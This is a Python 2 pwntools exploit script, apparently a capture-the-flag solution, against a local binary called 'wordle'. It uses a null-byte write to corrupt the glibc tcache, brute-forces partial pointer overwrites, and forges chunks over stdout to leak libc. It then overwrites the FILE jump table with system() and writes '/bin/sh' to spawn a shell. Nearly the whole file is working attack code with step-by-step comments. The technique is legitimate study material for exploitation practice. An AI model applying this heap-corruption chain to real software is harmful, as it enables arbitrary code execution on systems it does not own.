#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
import signal
from pwn import *


def handler(signum, frame):
    print 1
    raise Exception('Action took too much time')

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb, timeout = 1)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
    gdbscript = 'directory %smalloc/\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio/\n' % glibc_dir
    gdbscript += 'directory %self/\n' % glibc_dir
    gdbscript += 'set resolve-heap-via-heuristic on\n'
    gdbscript += 'set follow-fork-mode parent\n'
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

def readBuf(size, data, conti):
    sla("Size of input", str(size))
    sea("rt word lis", data)
    sla("Continue? (Y/N", conti)

def ModifyNull(offset, conti):
    sla("Size of input", str(offset))
    sla("Continue? (Y/N", conti)

elf = ELF('./wordle')
context(arch = elf.arch ,log_level = 'debug', os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])
signal.signal(signal.SIGALRM, handler)

while(True):
    try:
        signal.alarm(5)
        p = process("./wordle")
        sla("Choice:", "2")

        # 1. Modify the last byte of tachebin to null, let it point to tcachebin

        ## prepare some heap chunks
        readBuf(0x70, "a", "Y")
        readBuf(0x200, "a", "Y")

        # let 0x200 heap chunk insert into tcache
        # Here this heap chunk is next_fake_chunk, would be utilized later ot bypass security check
        next_fake_chunk = "a" * 0x10 + p64(0) + p64(0x31) + "a" * 0x20 + p64(0) + p64(0x21)
        readBuf(0x220, next_fake_chunk, "Y")

        # modify the second last byte of tcache(0x210), let it point to tcache header (1/16 probablity)
        ModifyNull(-0x1798 + 2, "Y")



        # 2. Leave an unsorted bin address on top of the tcache structure

        # get out the 0x200 chunk
            # 1. Forge a fake chunk at tcache(0x80), whose offset inside tcache structure is 
            #    0xb0 = 0x80 + 0x80/2 - 0x10 offset), the size of forged header should exceed region of tcachebin
            #    ,actual size depends on the distance between it and a controlled chunk (next_fake_chunk)
            # 2. Prepare the header on the next chunk of the fake chunk (next_fake_chunk)
            # 3. Modify the last two bytes of the 0x110 heap chunk, let it points to the fake chunk

        payload = '\x01' * 0x38 + "\x02\x00\x00\x00\x00\x00\x01\x00" + '\x00' * 0x68
        payload += p64(0x1881)
        payload = payload.ljust(0x160, '\x00')
        payload += '\xc0\x00'
        readBuf(0x200, payload, "Y")

        # Take out the 0x110 heap chunk, it is allocated at tcache(0x80)
        readBuf(0x100, "a", "Y")

        # Free it, then it would be inserted into unsorted bin
        readBuf(0x1d0, "a", "Y")

        # Take out the heap chunk overlapped with tcache structure again, and modify the last two bytes of
        # the glibc address, let it point to _IO_2_1_STDOUT__ (1/16 probablity again)
        payload = "\x01\x00" * 0x24
        payload = payload.ljust(0xb8, "\x00")
        payload += "\x60\x17"
        readBuf(0x280, payload, "Y")



        # 3. Get out the 0x80 heap chunk, it would be allocated on _IO_2_1_STDOUT__, and modify flag and IO_write_ptr to leak glibc address
        readBuf(0x1, '\x01', "Y")
        payload = p64(0xfbad1887) + p64(0) * 2 + "testtest" + '\x60'
        readBuf(0x80, payload, "Y")

        sla("Size of input", str(0x80))
        sea("rt word lis", payload)
        ru("testtest")

        ## get glibc address
        libc_base = u64(rc(6) + '\x00' * 2) - 0x219760
        stdout = libc_base + 0x219760
        jumptable = libc_base + 0x21a560
        sys_addr = libc_base + 0x54ae0
        io_finish = libc_base + 0x8ff80
        sla("Continue? (Y/N", "Y")

        # 5. Fix the header of _IO_2_1_STDOUT__ heap chunk, to bypass security check
        readBuf(0x70, p64(0xfbad1887) + '\x00' * 0x50 + p64(0x21), "Y")
        ModifyNull(0, "Y")
        ModifyNull(-1, "Y")
        ModifyNull(-2, "Y")
        ModifyNull(-3, "Y")
        ModifyNull(-4, "Y")
        ModifyNull(-5, "Y")
        ModifyNull(-6, "Y")
        
        # 6. Take out of the heap chunk overlapped with tcache structure again, then make some 
        #    tcachebin chunks point to IO_File_jumptable and _IO_2_1_STDOUT__
        payload = "\x01\x00" * 0x40 + p64(jumptable-0x20) * 0x5 + p64(stdout) * 5
        readBuf(0x280, payload, "Y")
        readBuf(0x10, "a", "Y")
        print(hex(jumptable))
        print(hex(sys_addr))


        # 7. Take out of the IO_File_jumptable heap chunk, modify IO_overflow to system
        sla("Size of input", str(0x50))
        sea("rt word lis", p64(2)*6 + p64(io_finish) + p64(sys_addr))
        sla("Continue? (Y/N", "Y")
        ModifyNull(0, "Y")
        ModifyNull(-1, "Y")
        ModifyNull(-2, "Y")
        ModifyNull(-3, "Y")
        ModifyNull(-4, "Y")
        ModifyNull(-5, "Y")
        ModifyNull(-6, "Y")

        # 8. Take out of the _IO_2_1_STDOUT__ fake chunk, modify the first 8 bytes to 
        #    "/bin/sh" (first argument of IO_overflow, which is modified to system)
        sla("Size of input", str(0x60))
        sea("rt word lis", "/bin/sh;")
        signal.alarm(0)
        p.interactive()
    
    except Exception as e:
        print(e)



